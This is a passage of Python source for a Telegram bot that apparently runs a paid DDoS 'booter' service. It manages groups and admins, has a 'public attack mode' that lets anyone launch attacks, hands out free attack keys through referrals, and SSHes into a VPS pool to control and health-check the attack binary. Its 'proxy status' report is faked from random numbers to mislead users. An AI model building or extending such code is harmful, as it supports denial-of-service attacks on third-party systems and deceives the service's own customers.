    groups_list = "\n".join(f"{i+1}. `{gid}`" for i, gid in enumerate(ALLOWED_GROUP_IDS))
    safe_reply_to(message, f"⚙️ 𝗖𝗵𝗼𝗼𝘀𝗲 𝗴𝗿𝗼𝘂𝗽 𝗻𝘂𝗺𝗯𝗲𝗿 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲:\n\n{groups_list}", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_remove_group)

def process_remove_group(message):
    """Process group removal with premium styling"""
    try:
        idx = int(message.text.strip()) - 1
        if 0 <= idx < len(ALLOWED_GROUP_IDS):
            removed_group = ALLOWED_GROUP_IDS.pop(idx)
            safe_reply_to(message, f"✅ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 𝗚𝗿𝗼𝘂𝗽 𝗜𝗗 `{removed_group}`", parse_mode="Markdown")
        else:
            safe_reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗵𝗼𝗶𝗰𝗲!")
    except Exception as e:
        safe_reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

@bot.message_handler(func=lambda msg: msg.text == "🌐 𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾")
def activate_public(message):
    """Activate public attack mode for a group with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗽𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲!")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        if group_id in PUBLIC_GROUPS:  # Skip already public groups
            continue
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"🌐 {chat.title}"))
        except:
            continue
    
    if len(markup.keyboard) == 0:  # No groups available
        safe_reply_to(message, "⚠️ 𝗔𝗹𝗹 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗴𝗿𝗼𝘂𝗽𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗽𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲 𝗮𝗰𝘁𝗶𝘃𝗲!", reply_markup=create_main_keyboard(message))
        return
    
    markup.add(telebot.types.KeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹"))
    
    safe_reply_to(message, "🛠️ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗴𝗿𝗼𝘂𝗽 𝗳𝗼𝗿 𝗽𝘂𝗯𝗹𝗶𝗰 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 (𝟭𝟮𝟬𝘀 𝗹𝗶𝗺𝗶𝘁, 𝟭 𝗩𝗣𝗦):", reply_markup=markup)
    bot.register_next_step_handler(message, process_public_group_selection)

def process_public_group_selection(message):
    """Process group selection for public mode with premium styling"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        safe_reply_to(message, "🚫 𝗣𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗶𝗼𝗻 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", reply_markup=create_main_keyboard(message))
        return
    
    selected_title = message.text[2:]  # Remove the 🌐 prefix
    selected_group = None
    
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            continue
    
    if not selected_group:
        safe_reply_to(message, "❌ 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", reply_markup=create_main_keyboard(message))
        return
    
    # Add the selected group to public groups list
    if selected_group not in PUBLIC_GROUPS:
        PUBLIC_GROUPS.append(selected_group)
    
    safe_reply_to(message, 
        f"""
╭━━━〔 🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗠𝗢𝗗𝗘 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 〕━━━╮
┃
┣ 🔹 𝗚𝗿𝗼𝘂𝗽: {selected_title}
┣ ⏱ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟭𝟮𝟬𝘀
┣ 🧵 𝗠𝗮𝘁𝘁𝗮𝗰𝗸𝘀: 𝟭𝟬𝟬
┣ 🔓 𝗡𝗼 𝗸𝗲𝘆 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
""", 
        reply_markup=create_main_keyboard(message))
    
    # Send announcement to the selected group
    try:
        safe_send_message(
            selected_group,
            """
╭━━━〔 🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗢𝗗𝗘 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 〕━━━╮
┃
┣ 🔥 𝗔𝗻𝘆𝗼𝗻𝗲 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗹𝗮𝘂𝗻𝗰𝗵 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!
┃
┣ ⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:
┣ ⏱ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟭𝟮𝟬𝘀
┣ 🧵 𝗠𝗮𝘅 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: 𝟭8𝟬𝟬
┣ 🔓 𝗡𝗼 𝗸𝗲𝘆 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱
┃
┣ 💡 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗮𝘀 𝘂𝘀𝘂𝗮𝗹!
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
        )
    except Exception as e:
        print(f"[ERROR] Could not send public mode announcement: {e}")

@bot.message_handler(func=lambda msg: msg.text == "❌ 𝘿𝙀𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾")
def deactivate_public_start(message):
    """Start deactivation of public attack mode with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "❌ Only owner can deactivate public mode!")
        return

    if not PUBLIC_GROUPS:
        safe_reply_to(message, "ℹ️ Public mode is not active on any group.")
        return

    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)

    for group_id in PUBLIC_GROUPS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"❌ {chat.title}"))
        except:
            markup.add(telebot.types.KeyboardButton(f"❌ Unknown Group ({group_id})"))

    markup.add(telebot.types.KeyboardButton("❌ Cancel"))

    safe_reply_to(message, "Select group(s) to deactivate public mode:", reply_markup=markup)
    bot.register_next_step_handler(message, process_deactivate_public_selection)

def process_deactivate_public_selection(message):
    """Process deactivation of public mode with premium styling"""
    if message.text == "❌ Cancel":
        safe_reply_to(message, "❌ Deactivation cancelled.", reply_markup=create_main_keyboard(message))
        return

    selected_title = message.text[2:]  # remove ❌ emoji

    # Find which group was selected
    selected_group = None
    for group_id in PUBLIC_GROUPS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            if f"Unknown Group ({group_id})" == selected_title:
                selected_group = group_id
                break

    if selected_group:
        PUBLIC_GROUPS.remove(selected_group)
        try:
            safe_send_message(selected_group, "❌ PUBLIC ATTACK MODE HAS BEEN DEACTIVATED.")
        except:
            pass
        safe_reply_to(message, f"✅ Public mode deactivated for {selected_title}.", reply_markup=create_main_keyboard(message))
    else:
        safe_reply_to(message, "❌ Selected group not found in public groups list.", reply_markup=create_main_keyboard(message))
        
# ======================
# 👥 ADMIN MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "➕ 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉")
def start_add_admin(message):
    """Start admin addition process with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "❌ 𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥𝗦 𝗖𝗔𝗡 𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡𝗦!")
        return
    safe_reply_to(message, "📝 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗸 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 (without @) 𝗼𝗳 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗮𝗱𝗱:")
    bot.register_next_step_handler(message, process_add_admin)

def process_add_admin(message):
    """Process admin addition with premium styling"""
    username = message.text.strip().lstrip("@")
    if username in ADMIN_IDS:
        safe_reply_to(message, f"⚠️ @{username} 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        return
    ADMIN_IDS.append(username)
    save_admins()
    safe_reply_to(message, f"✅ 𝗔𝗗𝗗𝗘𝗗: @{username} 𝗶𝘀 𝗻𝗼𝘄 𝗮𝗻 𝗔𝗗𝗠𝗜𝗡.")

@bot.message_handler(func=lambda msg: msg.text == "➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝘼𝘿𝙈𝙄𝙉")
def start_remove_admin(message):
    """Start admin removal process with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "❌ 𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥𝗦 𝗖𝗔𝗡 𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗗𝗠𝗜𝗡𝗦!")
        return
    safe_reply_to(message, "📝 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 (without @) 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲:")
    bot.register_next_step_handler(message, process_remove_admin)

def process_remove_admin(message):
    """Process admin removal with premium styling"""
    username = message.text.strip().lstrip("@")
    if username not in ADMIN_IDS:
        safe_reply_to(message, f"❌ @{username} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝗹𝗶𝘀𝘁.")
        return
    ADMIN_IDS.remove(username)
    save_admins()
    safe_reply_to(message, f"🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘𝗗: @{username} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗳𝗿𝗼𝗺 𝗔𝗗𝗠𝗜𝗡𝗦.")    
    
@bot.message_handler(func=lambda msg: msg.text == "📋 𝗔𝗗𝗠𝗜𝗡 𝗟𝗜𝗦𝗧")
def show_admin_list(message):
    """Show list of all admins with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝘃𝗶𝗲𝘄 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝗹𝗶𝘀𝘁!")
        return

    if not ADMIN_IDS:
        safe_reply_to(message, "⚠️ 𝗡𝗼 𝗮𝗱𝗺𝗶𝗻𝘀 𝗳𝗼𝘂𝗻𝗱.")
        return

    admin_list = "\n".join([f"• @{username}" for username in ADMIN_IDS])
    safe_reply_to(message, f"📋 *𝗔𝗗𝗠𝗜𝗡𝗦 𝗟𝗜𝗦𝗧:*\n\n{admin_list}", parse_mode="Markdown")

# ======================
# 🎁 REFERRAL SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🎁 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗥𝗘𝗙𝗙𝗘𝗥𝗔𝗟")
def generate_referral(message):
    """Generate referral link for user with premium styling"""
    user_id = str(message.from_user.id)
    
    # Check if user already has a referral code
    if user_id in REFERRAL_CODES:
        code = REFERRAL_CODES[user_id]
    else:
        # Generate new referral code
        code = f"RAJApapa-{user_id[:4]}-{os.urandom(2).hex().upper()}"
        REFERRAL_CODES[user_id] = code
        save_data()
    
    # Create referral link
    referral_link = f"https://t.me/{bot.get_me().username}?start={code}"
    
    response = f"""
🌟 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗣𝗥𝗢𝗚𝗥𝗔𝗠 🌟

🔗 𝗬𝗼𝘂𝗿 𝗿𝗲𝗳𝗲𝗿𝗿𝗮𝗹 𝗹𝗶𝗻𝗸:
{referral_link}

𝗛𝗼𝘄 𝗶𝘁 𝘄𝗼𝗿𝗸𝘀:
1. Share this link with friends
2. When they join using your link
3. 𝗕𝗢𝗧𝗛 𝗼𝗳 𝘆𝗼𝘂 𝗴𝗲𝘁 𝗮 𝗳𝗿𝗲𝗲 {REFERRAL_REWARD_DURATION}𝘀 𝗮𝘁𝘁𝗮𝗰𝗸!
   (Valid for 10 minutes only)

💎 𝗧𝗵𝗲 𝗺𝗼𝗿𝗲 𝘆𝗼𝘂 𝘀𝗵𝗮𝗿𝗲, 𝘁𝗵𝗲 𝗺𝗼𝗿𝗲 𝘆𝗼𝘂 𝗲𝗮𝗿𝗻!
"""
    safe_reply_to(message, response)

def handle_referral(message, referral_code):
    """Process referral code usage with premium styling"""
    new_user_id = str(message.from_user.id)
    
    # Check if this user already exists in the system
    if new_user_id in redeemed_users or new_user_id in REFERRAL_LINKS:
        return  # Existing user, don't generate new keys
    
    # Check if this is a valid referral code
    referrer_id = None
    for uid, code in REFERRAL_CODES.items():
        if code == referral_code:
            referrer_id = uid
            break
    
    if referrer_id:
        # Store that this new user came from this referrer
        REFERRAL_LINKS[new_user_id] = referrer_id
        
        # Generate free attack keys for both users (valid for 10 minutes)
        expiry_time = time.time() + 600  # 10 minutes in seconds
        
        # For referrer
        referrer_key = f"REF-{referrer_id[:4]}-{os.urandom(2).hex().upper()}"
        keys[referrer_key] = {
            'expiration_time': expiry_time,
            'generated_by': "SYSTEM",
            'duration': REFERRAL_REWARD_DURATION
        }
        
        # For new user
        new_user_key = f"REF-{new_user_id[:4]}-{os.urandom(2).hex().upper()}"
        keys[new_user_key] = {
            'expiration_time': expiry_time,
            'generated_by': "SYSTEM",
            'duration': REFERRAL_REWARD_DURATION
        }
        
        save_data()
        
        # Notify both users
        try:
            # Message to referrer
            safe_send_message(
                referrer_id,
                f"🎉 𝗡𝗘𝗪 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟!\n"
                f"👤 {get_display_name(message.from_user)} used your referral link\n"
                f"🔑 𝗬𝗼𝘂𝗿 𝗿𝗲𝘄𝗮𝗿𝗱 𝗸𝗲𝘆: {referrer_key}\n"
                f"⏱ {REFERRAL_REWARD_DURATION}𝘀 𝗳𝗿𝗲𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 (Valid for 10 minutes)"
            )
            
            # Message to new user
            safe_send_message(
                message.chat.id,
                f"🎁 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗕𝗢𝗡𝗨𝗦!\n"
                f"🔑 𝗬𝗼𝘂𝗿 𝗿𝗲𝘄𝗮𝗿𝗱 𝗸𝗲𝘆: {new_user_key}\n"
                f"⏱ {REFERRAL_REWARD_DURATION}𝘀 𝗳𝗿𝗲𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 (Valid for 10 minutes)\n\n"
                f"𝗨𝘀𝗲 redeem key button to redeem your key!"
            )
        except Exception as e:
            print(f"Error sending referral notifications: {e}")

# ======================
# 🍅 PROXY STATUS (STYLISH VERSION)
# ======================
def get_proxy_status():
    """Generate proxy status report in a formatted box with premium styling"""

    countries = [
        ("United States", "🇺🇸"), ("Germany", "🇩🇪"), ("Japan", "🇯🇵"),
        ("Singapore", "🇸🇬"), ("Netherlands", "🇳🇱"), ("France", "🇫🇷"),
        ("United Kingdom", "🇬🇧"), ("Canada", "🇨🇦"), ("Russia", "🇷🇺"),
        ("Brazil", "🇧🇷"), ("India", "🇮🇳"), ("Australia", "🇦🇺"),
        ("South Korea", "🇰🇷"), ("Sweden", "🇸🇪"), ("Switzerland", "🇨🇭"),
        ("Italy", "🇮🇹"), ("Spain", "🇪🇸"), ("Norway", "🇳🇴"),
        ("Mexico", "🇲🇽"), ("South Africa", "🇿🇦"), ("Poland", "🇵🇱"),
        ("Turkey", "🇹🇷"), ("Argentina", "🇦🇷"), ("Thailand", "🇹🇭"),
        ("Ukraine", "🇺🇦"), ("Malaysia", "🇲🇾"), ("Indonesia", "🇮🇩"),
        ("Philippines", "🇵🇭"), ("Vietnam", "🇻🇳"), ("Saudi Arabia", "🇸🇦")
    ]
    
    # Randomly select 6 to 8 countries
    selected_countries = random.sample(countries, random.randint(6, 8))
    
    rows = []
    for country, flag in selected_countries:
        if random.random() < 0.6:
            ping = random.randint(5, 50)
            status = "✅ ACTIVE"
            ping_display = f"{ping} ms"
        else:
            status = "❌ BUSY"
            ping_display = "--"
        rows.append((f"{flag} {country}", status, ping_display))

    # Column widths
    col1_width = 19
    col2_width = 11
    col3_width = 8

    def format_row(row):
        return f"| {row[0]:<{col1_width}}| {row[1]:<{col2_width}}| {row[2]:<{col3_width}}|"

    border = f"+{'-' * (col1_width + 1)}+{'-' * (col2_width + 1)}+{'-' * (col3_width + 1)}+"

    # Build the table
    table = [border]
    table.append(format_row(["Country", "Status", "Ping"]))
    table.append(border)

    for row in rows:
        table.append(format_row(row))
        table.append("")  # Empty line between rows

    table.append(border)
    table.append("")
    table.append("✅ ACTIVE - Available")
    table.append("❌ BUSY  - Proxy overloaded")
    table.append(f"\n 🚀 Total: {len(rows)} proxies, {sum(1 for row in rows if 'ACTIVE' in row[1])} available")

    return "\n".join(table)

@bot.message_handler(func=lambda msg: msg.text == "🍅 𝙋𝙍𝙊𝙓𝙔 𝙎𝙏𝘼𝙏𝙐𝙎")
def show_proxy_status(message):
    """Show proxy status with loading animation and premium styling"""
    # Send processing message
    processing_msg = safe_send_message(message.chat.id, "🔍 Scanning global proxy network...")
    
    # Create loading animation
    dots = ["", ".", "..", "..."]
    for i in range(4):
        try:
            bot.edit_message_text(
                f"🔍 Scanning global proxy network{dots[i]}",
                message.chat.id,
                processing_msg.message_id
            )
            time.sleep(0.5)
        except:
            pass
    
    # Wait total 2 seconds
    time.sleep(0.5)  # Additional delay after animation
    
    # Get and send the status report
    status_report = get_proxy_status()
    
    try:
        bot.edit_message_text(
            status_report,
            message.chat.id,
            processing_msg.message_id
        )
    except:
        safe_send_message(message.chat.id, status_report)
        
# Add this handler to your bot (place it with other message handlers)
@bot.message_handler(func=lambda msg: msg.text == "🛑 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆")
def stop_user_attack(message):
    """Stop all running attacks for the current user with premium styling"""
    user_id = str(message.from_user.id)
    
    # Find all running attacks by this user
    user_attacks = [aid for aid, details in running_attacks.items() if details['user_id'] == user_id]
    
    if not user_attacks:
        safe_reply_to(message, "⚠️ 𝗡𝗼 𝗿𝘂𝗻𝗻𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗳𝗼𝘂𝗻𝗱 𝘁𝗼 𝘀𝘁𝗼𝗽.")
        return
    
    # Try to stop each attack
    stopped_count = 0
    for attack_id in user_attacks:
        attack_details = running_attacks.get(attack_id)
        if attack_details:
            try:
                # Get VPS details
                vps_ip = attack_details['vps_ip']
                vps = next((v for v in VPS_LIST if v[0] == vps_ip), None)
                
                if vps:
                    ip, username, password = vps
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=username, password=password, timeout=10)
                    
                    # Kill the attack process
                    ssh.exec_command(f"pkill -f {BINARY_NAME}")
                    ssh.close()
                    stopped_count += 1
            except Exception as e:
                print(f"Error stopping attack: {e}")
            finally:
                # Remove from running attacks
                running_attacks.pop(attack_id, None)
    
    if stopped_count > 0:
        safe_reply_to(message, f"✅ 𝗦𝘁𝗼𝗽𝗽𝗲𝗱 {stopped_count} 𝗮𝘁𝘁𝗮𝗰𝗸{'𝘀' if stopped_count > 1 else ''}!")
    else:
        safe_reply_to(message, "⚠️ 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝘀𝘁𝗼𝗽 𝗮𝗻𝘆 𝗮𝘁𝘁𝗮𝗰𝗸𝘀.")

# Add this function in the HELPER FUNCTIONS section
def get_vps_health(ip, username, password):
    """Get VPS health with raw metrics and percentage"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=10)
        
        health_data = {
            'cpu': None,
            'memory': None,
            'disk': None,
            'binary_exists': False,
            'binary_executable': False,
            'network': False,
            'health_percent': 0
        }
        
        # 1. Check CPU usage
        stdin, stdout, stderr = ssh.exec_command("top -bn1 | grep 'Cpu(s)' | awk '{print $2 + $4}'")
        cpu_usage = float(stdout.read().decode().strip())
        health_data['cpu'] = f"{cpu_usage:.1f}%"
        
        # 2. Check memory usage
        stdin, stdout, stderr = ssh.exec_command("free -m | awk 'NR==2{printf \"%.2f\", $3*100/$2 }'")
        mem_usage = float(stdout.read().decode().strip())
        health_data['memory'] = f"{mem_usage:.1f}%"
        
        # 3. Check disk usage
        stdin, stdout, stderr = ssh.exec_command("df -h | awk '$NF==\"/\"{printf \"%s\", $5}'")
        disk_usage = stdout.read().decode().strip()
        health_data['disk'] = disk_usage
        
        # 4. Check binary exists
        stdin, stdout, stderr = ssh.exec_command(f"ls -la /home/master/{BINARY_NAME} 2>/dev/null || echo 'Not found'")
        binary_exists = "Not found" not in stdout.read().decode()
        health_data['binary_exists'] = binary_exists
        
        # 5. Check binary executable
        stdin, stdout, stderr = ssh.exec_command(f"test -x /home/master/<{BINARY_NAME} && echo 'Executable' || echo 'Not executable'")
        binary_executable = "Executable" in stdout.read().decode()
        health_data['binary_executable'] = binary_executable
        
        # 6. Check network connectivity
        stdin, stdout, stderr = ssh.exec_command("ping -c 1 google.com >/dev/null 2>&1 && echo 'Online' || echo 'Offline'")
        network_ok = "Online" in stdout.read().decode()
        health_data['network'] = network_ok
        
        ssh.close()
        
        # Calculate health percentage
        health_score = 0
        max_score = 6  # Total possible points
        
        if cpu_usage < 80: health_score += 1
        if mem_usage < 80: health_score += 1
        if int(disk_usage.strip('%')) < 80: health_score += 1
        if binary_exists: health_score += 1
        if binary_executable: health_score += 1
        if network_ok: health_score += 1
        
        health_data['health_percent'] = int((health_score / max_score) * 100)
        
        return health_data
        
    except Exception as e:
        print(f"Error checking VPS health for {ip}: {e}")
        return {
            'cpu': "Error",
            'memory': "Error",
            'disk': "Error",
            'binary_exists': False,
            'binary_executable': False,
            'network': False,
            'health_percent': 0
        }

# Update the handler to show raw metrics
@bot.message_handler(func=lambda msg: msg.text == "🏥 𝙑𝙋𝙎 𝙃𝙀𝘼𝙇𝙏𝙃")
def show_vps_health(message):
    """Show detailed health status of all VPS servers"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "⛔ Only owner can check VPS health!")
        return
    
    if not VPS_LIST:
        safe_reply_to(message, "❌ No VPS configured!")
        return
    
    msg = safe_send_message(message.chat.id, "🩺 Scanning VPS health metrics...")
    
    health_reports = []
    for i, vps in enumerate(VPS_LIST):
        if len(vps) < 3:
            ip = vps[0] if len(vps) > 0 else "Unknown"
            username = vps[1] if len(vps) > 1 else "Unknown"
            password = vps[2] if len(vps) > 2 else "Unknown"
        else:
            ip, username, password = vps
        
        health = get_vps_health(ip, username, password)
        
        # Create health visualization
        filled = '█' * int(health['health_percent'] / 10)
        empty = '░' * (10 - len(filled))
        health_bar = f"[{filled}{empty}] {health['health_percent']}%"
        
        # Determine status emoji
        if health['health_percent'] >= 80:
            status = "🟢 EXCELLENT"
        elif health['health_percent'] >= 50:
            status = "🟡 STABLE"
        else:
            status = "🔴 CRITICAL"
        
        health_reports.append(
            f"🔹 *VPS {i+1} - {ip}*\n"
            f"├ *Status*: {status}\n"
            f"├ *Health*: {health_bar}\n"
            f"├ *CPU*: {health['cpu']}\n"
            f"├ *Memory*: {health['memory']}\n"
            f"├ *Disk*: {health['disk']}\n"
            f"├ *Binary*: {'✅ Exists' if health['binary_exists'] else '❌ Missing'}\n"
            f"├ *Executable*: {'✅ Yes' if health['binary_executable'] else '❌ No'}\n"
            f"└ *Network*: {'✅ Online' if health['network'] else '❌ Offline'}\n"
        )
    
    # Calculate overall health
    total_health = sum(get_vps_health(vps[0], vps[1], vps[2])['health_percent'] for vps in VPS_LIST if len(vps) >= 3)
    avg_health = total_health // len(VPS_LIST) if VPS_LIST else 0
    
    summary = (
        f"📊 *VPS Health Summary*\n"
        f"🟢 Excellent (80-100%): {sum(1 for vps in VPS_LIST if get_vps_health(vps[0], vps[1], vps[2])['health_percent'] >= 80)}\n"
        f"🟡 Stable (50-79%): {sum(1 for vps in VPS_LIST if 50 <= get_vps_health(vps[0], vps[1], vps[2])['health_percent'] < 80)}\n"
        f"🔴 Critical (0-49%): {sum(1 for vps in VPS_LIST if get_vps_health(vps[0], vps[1], vps[2])['health_percent'] < 50)}\n"
        f"📈 Average Health: {avg_health}%\n\n"
        f"*Detailed Reports:*\n"
    )
    
    full_message = summary + "\n\n".join(health_reports)
    
    try:
        bot.edit_message_text(full_message, message.chat.id, msg.message_id, parse_mode="Markdown")
    except:
        if len(full_message) > 4000:
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                safe_send_message(message.chat.id, part, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, full_message, parse_mode="Markdown")

# ======================
# 🚀 BOT INITIALIZATION
# ======================
if __name__ == '__main__':
    load_data()
    load_admins()
    print("𝗕𝗼𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗹𝗮𝘂𝗻𝗰𝗵𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! »»—— RAJA BHAI ♥")
    bot.polling(none_stop=True)
    
    
    
    
    
    
    
    
    



